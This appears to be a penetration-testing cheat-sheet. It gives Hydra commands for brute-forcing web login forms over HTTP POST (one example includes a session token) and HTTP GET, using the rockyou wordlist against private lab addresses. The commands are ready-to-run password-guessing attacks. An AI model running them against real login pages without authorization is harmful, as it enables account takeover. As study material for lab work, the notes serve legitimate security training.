
#### HTTP-POST-Request
example
	note: the http-post-form request must match entirely what is in the request
		ie: if there is a token, you have to include it too:
```
# example 1

hydra -l <user> -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

# example 2 (including a token)

hydra -L </path/to/user_list> -p <password> 192.168.204.108 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=password&token=ecd599a8dc3b8c1f20f961fc11a4adb33f2a665d67a2a8c70d3cb5166ee52e37:Login failed. Invalid"

```

## HTTP-GET
```
# example 1

hydra -L list -P /usr/share/wordlists/rockyou.txt 192.168.190.201 http-get /
```